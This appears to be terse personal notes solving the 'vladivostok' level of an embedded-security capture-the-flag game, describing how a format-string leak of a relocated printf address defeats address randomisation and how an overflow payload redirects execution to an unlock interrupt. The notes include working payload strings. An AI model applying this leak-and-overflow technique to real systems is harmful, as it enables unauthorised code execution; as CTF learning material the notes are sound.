# vladivostok: #

Code gets relocated to a "random" address
5th and 6th bytes of password end up in r10
7th and 8th bytes of password end up in r11
9th and 10th bytes of password end up in pc, can jump to anywhere that you can encode in two bytes of input

1: code = 0xb280
2: code = 0xc2e0
3: code = 0xdc90
4: code = 0xc230
5: code = 0xb170
n: code = 0xcc10


when input of password is prompted, addr to execute is at sp+0x1a
0102030400ff0708{addr}024ab0121000 <-- works but no way to predict sp yet

cheated (googled it):

printf address relocated is in r12, username gets printed directly, %y%x dumps address of relocated printf. Calc difference between printf and _INT, can cause pc to jump to _INT

0x182 is the difference from printf to 0x182

0102030405060708{&printf + 0x182}0b0c7f00
